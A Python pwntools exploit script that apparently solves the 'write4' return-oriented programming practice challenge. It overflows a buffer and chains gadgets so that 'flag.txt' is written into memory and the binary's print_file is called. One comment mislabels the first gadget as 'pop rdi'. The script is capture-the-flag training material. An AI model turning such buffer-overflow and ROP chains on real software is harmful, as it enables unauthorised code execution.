from pwn import *

elf = ELF("write4")

p = process(elf.path)

offset = 40

# add the padding
payload = b'A' * offset

# pop rdi; ret
payload += p64(0x00400690)

# store .data addr in r14.
payload += p64(0x00601028) 

# store the flag in r15
payload += b'flag.txt'

# mov qword ptr [r14], r15; ret;
payload += p64(0x400628) 

# pop rdi gadget
payload += p64(0x400693) 

# populate %rdi with the .data addr
payload += p64(0x00601028) 
payload += p64(elf.plt.print_file)

print(payload)

# send the payload 
# after the program asks for it
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
